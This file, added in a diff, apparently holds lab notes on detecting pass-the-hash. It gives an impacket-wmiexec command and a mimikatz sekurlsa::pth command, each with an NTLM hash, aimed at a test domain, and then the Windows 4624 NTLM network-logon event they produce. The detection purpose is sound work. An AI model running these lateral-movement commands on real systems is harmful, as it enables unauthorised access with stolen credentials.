@@ -1,0 +1,73 @@
+/usr/bin/impacket-wmiexec -hashes 00000000000000000000000000000000:c71db7839faf1f6215d0bec5ff0c61f9 abc/user1@192.168.200.100 dir
+
+sekurlsa::pth /user:administrator /domain:abc.local /ntlm:9249b0f07d9ba7e22212c8c7d419035f
+
+007 99999 0007663930 35
+System 
+
+  - Provider 
+
+   [ Name]  Microsoft-Windows-Security-Auditing 
+   [ Guid]  {54849625-5478-4994-A5BA-3E3B0328C30D} 
+ 
+   EventID 4624 
+ 
+   Version 2 
+ 
+   Level 0 
+ 
+   Task 12544 
+ 
+   Opcode 0 
+ 
+   Keywords 0x8020000000000000 
+ 
+  - TimeCreated 
+
+   [ SystemTime]  2022-08-01T14:16:46.136159200Z 
+ 
+   EventRecordID 6787 
+ 
+   Correlation 
+ 
+  - Execution 
+
+   [ ProcessID]  624 
+   [ ThreadID]  2756 
+ 
+   Channel Security 
+ 
+   Computer WIN-9NLDSG8QACQ.abc.local 
+ 
+   Security 
+ 
+
+- EventData 
+
+  SubjectUserSid S-1-0-0 
+  SubjectUserName - 
+  SubjectDomainName - 
+  SubjectLogonId 0x0 
+  TargetUserSid S-1-5-21-1797645935-175931118-788172805-500 
+  TargetUserName Administrator 
+  TargetDomainName ABC 
+  TargetLogonId 0x207a54 
+  LogonType 3 
+  LogonProcessName NtLmSsp  
+  AuthenticationPackageName NTLM 
+  WorkstationName OSBOXES 
+  LogonGuid {00000000-0000-0000-0000-000000000000} 
+  TransmittedServices - 
+  LmPackageName NTLM V2 
+  KeyLength 128 
+  ProcessId 0x0 
+  ProcessName - 
+  IpAddress 192.168.200.173 
+  IpPort 43452 
+  ImpersonationLevel %%1833 
+  RestrictedAdminMode - 
+  TargetOutboundUserName - 
+  TargetOutboundDomainName - 
+  VirtualAccount %%1843 
+  TargetLinkedLogonId 0x0 
+  ElevatedToken %%1842 
